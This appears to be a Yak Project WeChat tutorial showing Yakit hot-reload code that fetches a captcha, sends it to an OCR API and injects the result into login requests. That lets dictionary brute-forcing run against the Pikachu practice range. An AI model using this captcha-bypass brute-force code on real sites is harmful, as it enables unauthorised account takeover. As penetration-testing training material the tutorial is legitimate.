---
title: 拿不下总统之位，那就用热加载拿下验证码识别与爆破好了！
url: https://mp.weixin.qq.com/s?__biz=Mzk0MTM4NzIxMQ==&mid=2247524449&idx=1&sn=722e674e5220798785a59ed140e66763&chksm=c2d11cc5f5a695d37721c1e3dc0e7bde0dcc7f780c944a7dbb1c0a37f80a08d0a313fff42a09&scene=58&subscene=0#rd
source: Yak Project
date: 2024-11-09
fetch_date: 2025-10-06T19:19:02.347376
---

# 拿不下总统之位，那就用热加载拿下验证码识别与爆破好了！

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudyQhQsZLLxl1HKnAIhvq8kuricnFQiawGjqfKkomcpKVK7TuzbGJaIuJA/0?wx_fmt=jpeg)

# 拿不下总统之位，那就用热加载拿下验证码识别与爆破好了！

原创

Yak

Yak Project

![](https://mmbiz.qpic.cn/mmbiz_gif/f7AtEgJhMZfCSs0zKcMmDXyJt76PDpGiataSbajd3BpbZnPXBCqFaA3icu2mY1LGqAmJHIiaCq5N9qCBv47ktQEYA/640?wx_fmt=gif&from=appmsg)

大家好，这里是在总统选举中**惜败**的超级牛

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfKSzVS9S0n2WLJpSnTamawOaJlXqTWnZLBGJmhL9ELthy14JUR0DJvMIZOr3yrZDiao7YkeAuicQkA/640?wx_fmt=png&from=appmsg)

虽然没能拿下阿美利卡总统之位

但是牛牛的**热加载**功能，却能轻松拿下**验证码的识别与爆破**

![](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudYEwKgrTRWKUKeuACA9RLaqk2MUIXHibxa7kicVPMHHT6ibIUsWCPUryRA/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudRCHianzTjiaQHUoGNBcX4VIB90Egd7rLydcyHvJbtdgvsC9r7OGWWicug/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudNNqPibg9jVj7J9ybJvKEotwib9WusjoAvOCQ7cWYuwakUiaog4meVwgqg/640?wx_fmt=png&from=appmsg)

验证码一般会在注册、登录等功能，用来防止自动化工具的攻击。一般的验证码生成过程如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudwsTS21qmia2icxBoleT6ticnJwqDIPicl98eR9B2rAg0QZ0kic2ddcQicA8A/640?wx_fmt=png&from=appmsg)

我们可以看到，验证码在访问功能页面的时候便已经生成，并且服务端在生成验证码的时候会将结果保存，并作为以用户输入的验证码做比较的依据。一般而言，验证码不具备复用性，在你输错验证码或者重新请求验证码接口的时候，后台便会刷新，并返回新的验证码，这大大提高了爆破的难度。

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudR73ZzY9y7DJkx4W9iatYjxt8DEyYogbtzQXvSsV2XShpA1R2ItnsMWQ/640?wx_fmt=png&from=appmsg)

那么，Yakit的热加载如何进行验证码爆破呢？答案是我们需要让热加载参与到**客户端请求验证码**、**客户端接收验证码**和**客户端发送验证码**的生命周期中。如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudQeiaGtpS27HWrKOl1Hicky2dkncsFh53IuibpwgeMdER0HZ8dHzLHJrRA/640?wx_fmt=png&from=appmsg)

* 客户端请求验证码：在这个阶段，我们可以使用poc库发送HTTP请求，请求一份验证码。
* 客户端接收验证码：这个阶段，在热加载中可以将服务端返回的图片验证码转化为base64形式，方便后续进行ocr图像识别。
* 客户端发送验证码：将base64形式的图片数据发送到图像识别平台，或者在本地搭建的如ddddocr图像识别接口进行识别，然后将识别得到的验证码替换原始报文中验证码参数并发送。

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudBP2wGDjVSG6LFtTKBuUAucToOc25oNYlS7LCv5ibUTibg23qkW8QfXlw/640?wx_fmt=png&from=appmsg)

理论形成，实践开始。

这里以pikachu靶场中验证码绕过(on server)为例。

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfKSzVS9S0n2WLJpSnTamawKq0KXRDwgz3raiaecgI8tlv000XmGd4OfgM9fHY2k6DctZV1XqBtFOA/640?wx_fmt=png&from=appmsg)

我们先随便输入一些内容，并抓包查看内容。可以发现对验证码进行了识别：

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfKSzVS9S0n2WLJpSnTamawfMJgZRmgearW3YotydvkUu0rZffzjCfZx51PqKPLPF7UJN0ibUJ6FPg/640?wx_fmt=png&from=appmsg)

然后我们开始编写热加载代码。从热加载参与验证码爆破的声明周期可以知道，我们只要在发送数据包之前做处理就可以，即我们热加载代码写在beforeRequest函数内就行。

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudpvPiaXibRcSkLWmOctGuibFMUUsY1aic6VQ3QnwQnWfpAOQEWonOOcgWbA/640?wx_fmt=png&from=appmsg)

首先通过查看验证码链接，知道验证码请求的接口为/pikachu/inc/showvcode.php,因此可以调用该接口得到验证码图像数据，并使用codec将其转化为base64的形式：

```
rsp, _ := poc.Get(`http://127.0.0.1/pikachu/inc/showvcode.php`)~imageData = rsp.GetBody()base64Image := codec.EncodeBase64(imageData)
```

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudu6yt2iciaRaPdXcwDb1Qyl0gictUaCqwTCGrx061owBAFwKiagssniaFWzA/640?wx_fmt=png&from=appmsg)

这里使用验证码识别平台进行识别验证码，将api的token及图像数据作为POST的参数进行发送。api返回的是json格式的数据，这里使用json库获取识别到的信息。并将请求包的\_\_verify\_\_替换为验证码。\_\_verify\_\_为占位符，以方便对参数进行替换。

```
apiURL = "http://api.example.com/api/ocr"   #验证码识别apitoken = "xxxxxxx"  #toekn
rsp,_=poc.Post(apiURL, poc.appendPostParam("image", base64Image),poc.appendPostParam("token",token))~result:=json.loads(rsp.GetBody())code=json.Find(result, `$.data.data`)req = re.ReplaceAll(req, `__verify__`, code)
```

完整的热加载代码如下：

```
// beforeRequest 允许发送数据包前再做一次处理，定义为 func(origin []byte) []bytebeforeRequest = func(req) {    rsp, _ := poc.Get(`http://127.0.0.1/pikachu/inc/showvcode.php`)~    imageData = rsp.GetBody()    base64Image := codec.EncodeBase64(imageData)
    apiURL = "http://api.example.com/api/ocr"   #验证码识别api    token = "xxxxxxx"  #toekn
    rsp,_=poc.Post(apiURL, poc.appendPostParam("image", base64Image),poc.appendPostParam("token",token))~    result:=json.loads(rsp.GetBody())    code=json.Find(result, `$.data.data`)    req = re.ReplaceAll(req, `__verify__`, code)    return []byte(req)}
```

请求包可以修改成如下，验证码参数使用\_\_verify\_\_作为占位符。然后账号和密码可以设置上自己的字典，并将并发线程设置为1，这样就能够爆破啦。

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfKSzVS9S0n2WLJpSnTamawwI5Ria1KQYfFdg1cUibdNKfR1iapABpzbOuIYdfiaMeBhGf9VDtdB8op6Q/640?wx_fmt=png&from=appmsg)

最后可以看到验证码成功被识别出来

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfKSzVS9S0n2WLJpSnTamawPkqq02t95NuGkicTd6A47MqMJdict32hGDCtGUR4XfDpP0sAMmnzcibdw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudNWH0qaxc9K4xge97s56JOUInGEsJT53OCfY1A39bia4OqcndmpVWMSA/640?wx_fmt=png&from=appmsg)

我们在社群接到小伙伴反馈说，所有设置都按照教程设置了，为什么验证码很多都没识别出来呢？这是这位小伙伴的热加载代码：

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfKSzVS9S0n2WLJpSnTamawprdrjkpZjpvEbAWmtVicpniatcUnejbAg1kG6IsMu1EKeVicVnq949sBA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZfKSzVS9S0n2WLJpSnTamawz0ibjUmUg2dU9ibtNmHj2tudLvmeKkgFhA2Vveuj1GyY8HMR98Z8icLkQ/640?wx_fmt=png&from=appmsg)

我们发现它在handle2使用了热加载，但是由于fuzztag会预先进行渲染，渲染的时候会发送一次验证码API，导致验证码刷新，从而使得后续识别到的验证码与session绑定的验证码不一致。

因此，在我们明确了热加载在验证码识别的生命周期，也就明白了为什么要写在**beforeRequest**里啦。

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudtib7p27JgMavx1GYLHh6Gm7ibpJSo1rWyJXY8RBuwgVdCd4IEa3sqBdw/640?wx_fmt=png&from=appmsg)

热加载用来验证码识别或者csrf token的思路其实是一样的，只不过多了个ocr的步骤。本文使用的字母与数字组合验证码，但是只要明确热加载参与的生命周期，识别其它验证码思路也是一致的。

**END**

****《CDSL-YAK 网络安全领域编程语言—从入门到实践》****

超级牛新书出版！

一本书带你CDSL-YAK从入门到起飞

直戳即可查看详情⬇️

**YAK官方资源**

Yak 语言官方教程：
*https://yaklang.com/docs/intro/*
Yakit 视频教程：
*https://space.bilibili.com/437503777*
Github下载地址：
*https://github.com/yaklang/yakit*
Yakit官网下载地址：
*https://yaklang.com/*
Yakit安装文档：
*https://yaklang.com/products/download\_and\_install*
Yakit使用文档：
*https://yaklang.com/products/intro/*
常见问题速查：
*https://yaklang.com/products/FAQ*

![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcGEibOlRNlz6ZPic3cWicMDwdqZLq9q0hibDYiaICia6nncspoDTRnjPXFGTr3VWd9FlV4YSXRStoabxbg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/f7AtEgJhMZeX0EdicJxBOjGjQuecg0TvCvRgqibPwyOUp8untXs9Cl5XKux2yQQf27ibgZ0ic0Fm2yicdbYg6c4xUJg/640?wx_fmt=gif&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZf3Jgic3A1naPbMWx6iaVCOHr8IyqePqDq1X4nJWqOEhuEjp8lwY18DgujicOSoysibVxFwRsMjUkQyYQ/0?wx_fmt=png)

Yak Project

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZf3Jgic3A1naPbMWx6iaVCOHr8IyqePqDq1X4nJWqOEhuEjp8lwY18DgujicOSoysibVxFwRsMjUkQyYQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过